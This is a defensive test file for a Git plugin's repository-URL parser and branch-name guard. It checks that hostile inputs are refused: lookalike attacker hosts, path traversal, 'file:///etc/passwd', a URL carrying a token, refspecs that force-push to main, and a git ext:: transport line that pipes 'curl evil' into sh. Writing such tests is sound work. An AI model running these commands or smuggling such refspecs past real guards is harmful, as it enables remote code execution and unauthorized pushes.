import { describe, it, expect } from "vitest";
import {
  parseRepo,
  repoLocation,
  sameRepoUrl,
  PROTECTED_BRANCHES,
  UNSAFE_BRANCH
} from "./url.js";

/**
 * The parsing, on its own, with nothing injected.
 *
 * Every case here is a string that looks like one thing and resolves to another,
 * which is why the file exists at all. The tools that *act* on these answers are
 * asserted in `index.spec.ts`; what is asserted here is the answer itself.
 */

describe("parseRepo", () => {
  it.each([
    ["https://github.com/owner/repo", "owner", "repo"],
    ["https://github.com/owner/repo.git", "owner", "repo"]
  ])("parses %s", (url, owner, repo) => {
    expect(parseRepo(url)).toEqual({ owner, repo });
  });

  it("returns undefined for a non-GitHub URL", () => {
    expect(parseRepo("https://gitlab.com/o/r")).toBeUndefined();
  });

  /**
   * The old pattern was unanchored, so `github.com` occurring anywhere in the
   * string was a match — including in the *path* of somebody else's host.
   */
  it.each([
    "https://evil.example.com/github.com/owner/repo",
    "https://attacker.test/?ref=github.com/o/r",
    "https://github.com.evil.test/o/r"
  ])("does not treat %s as GitHub", (url) => {
    expect(parseRepo(url)).toBeUndefined();
  });

  it("honours a configured host list, for Enterprise", () => {
    expect(parseRepo("https://git.acme.dev/o/r", ["git.acme.dev"])).toEqual({
      owner: "o",
      repo: "r"
    });
  });

  /**
   * Two different consequences, one check.
   *
   * `..` and `.` are ordinary matches for "a path segment that is not a slash",
   * and the repository name becomes a path: `https://github.com/o/..` gave a
   * checkout `dir` of `/workspace/..`, which is `/`. The separator characters are
   * the quieter half — `beforeCheckout` hands these to the host, and the README
   * tells that host to build a per-repository workspace key out of them, so a `|`
   * or a `:` is a separator inside somebody else's key format.
   */
  it.each([
    ["https://github.com/owner/..", "a traversing repository name"],
    ["https://github.com/owner/.", "a self-referential one"],
    ["https://github.com/../repo", "a traversing owner"],
    ["https://github.com/a|b/c", "a key separator"],
    ["https://github.com/o/r r", "a space"],
    ["https://github.com/o:1/r", "a colon"]
  ])("refuses %s (%s)", (url) => {
    expect(parseRepo(url)).toBeUndefined();
  });

  /**
   * Every transport but https, including the one that used to slip through.
   *
   * scp-like syntax was parsed on its own branch, ahead of the protocol check,
   * so `git@github.com:owner/repo.git` passed a gate whose refusal message
   * promises https. Nothing downstream could act on it — isomorphic-git has no
   * SSH transport — so it failed one step further from the model, which is the
   * worse place for it.
   */
  it.each([
    ["git@github.com:owner/repo.git", "scp-like syntax"],
    ["ssh://git@github.com/owner/repo.git", "an explicit ssh scheme"],
    ["http://github.com/owner/repo", "plain http"],
    ["file:///etc/passwd", "a local path"],
    ["ext::sh -c 'curl evil|sh'", "git's command transport"]
  ])("refuses %s (%s)", (url) => {
    expect(parseRepo(url)).toBeUndefined();
  });

  /** The rule is GitHub's own, so everything it actually issues still parses. */
  it.each([
    ["https://github.com/octo-cat/my_repo.js", "octo-cat", "my_repo.js"],
    ["https://github.com/a.b/c-d_e.f", "a.b", "c-d_e.f"]
  ])("still parses %s", (url, owner, repo) => {
    expect(parseRepo(url)).toEqual({ owner, repo });
  });
});

describe("branch names a push must not act on", () => {
  /**
   * `git push origin <name>` reads `<name>` as a refspec, so the shape has to be
   * checked before the name is: `+x:main` is a force push to `main` that the
   * protected-name check would wave through, because that check only ever sees a
   * literal string.
   */
  it.each([
    ["+coder/x", "a leading + is a force push"],
    ["coder/x:main", "a colon makes it <src>:<dst>"],
    ["refs/heads/main", "a full ref bypasses the name check"],
    ["coder/../main", ".. traverses the ref namespace"],
    ["coder/x.lock", "collides with git's own lock file"],
    ["coder/x/", "a trailing slash is not a branch"],
    ["coder x", "whitespace"],
    ["coder/x@{1}", "@{ is a reflog selector"]
  ])("refuses %s — %s", (branch) => {
    expect(UNSAFE_BRANCH.test(branch)).toBe(true);
  });

  it("allows the shape the tools actually ask for", () => {
    for (const ok of ["coder/add-json-flag", "fix-123", "feature/a_b.c"]) {
      expect(UNSAFE_BRANCH.test(ok)).toBe(false);
      expect(PROTECTED_BRANCHES.has(ok)).toBe(false);
    }
  });

  it("names the trunks a work branch must never be", () => {
    for (const trunk of ["main", "master", "trunk", "develop"]) {
      expect(PROTECTED_BRANCHES.has(trunk)).toBe(true);
    }
  });
});

/**
 * What a clone URL may carry beyond a host and a path.
 *
 * The allowlist reads `hostname`, and everything else in the string travels on
 * to whichever git the host runs. So the parts this function does not look at
 * are exactly the parts worth refusing.
 */
describe("repoLocation", () => {
  it.each([
    ["userinfo", "https://user:ghp_leaked@github.com/o/r"],
    ["a bare username", "https://user@github.com/o/r"],
    ["a doubled userinfo", "https://a@b@github.com/o/r"],
    ["a port", "https://github.com:8443/o/r"]
  ])("refuses %s", (_why, url) => {
    expect(repoLocation(url)).toBeUndefined();
  });

  it("hands back a canonical URL for callers to travel with", () => {
    // Case-folded, and without the query that means nothing to git — so what
    // reaches `.git/config` is one spelling rather than whatever was typed.
    expect(repoLocation("https://GitHub.com/o/r?ref=x#L1")?.url).toBe(
      "https://github.com/o/r"
    );
  });
});

/**
 * One repository, written several ways.
 *
 * `repo_clone` puts every spelling at the same directory, so a checkout has to
 * be recognised whichever one a later call uses. A literal comparison refuses
 * the repository that is actually there, and nothing in the plugin can clear
 * that refusal.
 */
describe("sameRepoUrl", () => {
  it.each([
    "https://github.com/o/r",
    "https://github.com/o/r.git",
    "https://github.com/o/r/",
    "https://github.com/o/r.git/",
    "  https://github.com/o/r  ",
    "https://GitHub.com/o/r"
  ])("matches %s against the plain form", (spelling) => {
    expect(sameRepoUrl(spelling, "https://github.com/o/r")).toBe(true);
  });

  it.each([
    ["a different repository", "https://github.com/o/other"],
    ["a different owner", "https://github.com/other/r"],
    // The reason this compares URLs rather than `parseRepo` results: two forges
    // can each hold an `o/r`, and they are not the same checkout.
    ["a different host", "https://git.acme.dev/o/r"]
  ])("does not match %s", (_why, other) => {
    expect(sameRepoUrl(other, "https://github.com/o/r")).toBe(false);
  });

  it("falls back to the literal string when a side does not parse", () => {
    // Deciding equality for input it cannot read is the wrong direction to be
    // wrong in, so an unparseable pair matches only itself.
    expect(sameRepoUrl("not a url", "not a url")).toBe(true);
    expect(sameRepoUrl("not a url", "https://github.com/o/r")).toBe(false);
  });
});
